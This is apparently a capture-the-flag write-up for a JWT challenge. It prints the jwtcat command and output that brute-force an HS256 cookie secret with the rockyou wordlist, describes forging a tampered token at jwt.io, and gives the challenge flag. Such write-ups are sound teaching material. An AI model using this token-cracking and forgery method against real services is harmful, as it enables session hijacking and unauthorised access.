## Author: p4w
## Description:
![img ](./description.png)

* we have an endpoint that give us a JWT HS256 signed cookie back
* bruteforce the cookie with this tool <a href='https://github.com/aress31/jwtcat'>jwtcat</a>

* command:
```
$ python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o -w /usr/share/wordlists/rockyou.txt
[INFO] JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o
[INFO] Wordlist: /usr/share/wordlists/rockyou.txt
[INFO] Starting brute-force attacks
jwtcat.py:110: DeprecationWarning: The 'warn' method is deprecated, use 'warning' instead
  logger.warn("Pour yourself some coffee, this might take a while..." )
[WARNING] Pour yourself some coffee, this might take a while...
[INFO] Secret key: fuckit
[INFO] Secret key saved to location: jwtpot.potfile
[INFO] Finished in 0.13006305694580078 sec
```

* so we foubnd the private key, now we can tamper the cookie and resign it. To do that I used https://jwt.io/

![img ](./tamper-jwt-cookie.png)

* now we can just set it and login with this and get the flag

* flag `LLS{jawt_was_just_what_you_thought}`
